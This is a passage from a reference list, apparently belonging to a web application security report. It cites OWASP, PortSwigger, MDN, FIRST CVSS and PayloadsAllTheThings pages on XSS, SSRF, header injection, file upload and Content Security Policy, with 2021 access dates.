Accessed 25 July 2021,
\<https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src#strict-dynamic\>

*CVSS v3.1 Specification Document* 2021
Accessed 21 July 2021,
\<https://www.first.org/cvss/v3.1/specification-document\>

*File upload functionality - PortSwigger* 2021,
Accessed 21 July 2021,
\<https://portswigger.net/kb/issues/00500980_file-upload-functionality\>

*HTTP response header injection - PortSwigger* 2021,
Accessed 21 July 2021,
\<https://portswigger.net/kb/issues/00200200_http-response-header-injection\>

*HTTP Response Splitting Software Attack | OWASP Foundation* 2021,
Accessed 21 July 2021,
\<https://owasp.org/www-community/attacks/HTTP_Response_Splitting\>

*OWASP Application Security FAQ* 2021,
Accessed 8 August 2021,
\<https://owasp.org/www-community/OWASP_Application_Security_FAQ\>

*PayloadsAllTheThings/README.md at master · swisskyrepo/PayloadsAllTheThings* 2021,
Accessed 7 August 2021,
\<https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Request%20Forgery/README.md\>

*REST Security - OWASP Cheat Sheet Series* 2021,
Accessed 8 August 2021,
\<https://cheatsheetseries.owasp.org/cheatsheets/REST_Security_Cheat_Sheet.html\>

*Server Side Request Forgery Prevention - OWASP Cheat Sheet Series* 2021,
Accessed 8 August 2021,
\<https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html\>

*What is cross-site scripting (XSS) and how to prevent it? | Web Security Academy* 2021,
Accessed 21 July 2021,
\<https://portswigger.net/web-security/cross-site-scripting\>
